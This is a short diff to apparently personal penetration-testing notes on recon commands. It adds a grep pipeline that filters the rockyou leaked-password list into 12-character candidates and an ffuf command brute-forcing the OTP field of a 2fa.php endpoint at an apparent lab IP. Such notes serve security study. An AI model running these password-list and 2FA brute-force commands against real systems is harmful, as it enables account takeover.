@@ -6,6 +6,8 @@ You can find important upload on top of page
 ### 1. Passive recognition
  - Command helpful for passive recognition 
 ```bash
+sudo grep [[:upper:]] /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep [[:lower:]] | grep [[:digit:]] | grep '^[[:alnum:][:space:]]*$' |grep -wE '\b\w{12}\b' > test.txt
+ffuf -w nb.txt -u http://94.237.51.60:37006/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "otp=FUZZ" -fr "Invalid OTP."
 whois <sitename.example>
 # query the DB whois to list the informations of a domain name
 nslookup -type=A <sitename.example> <IP address>
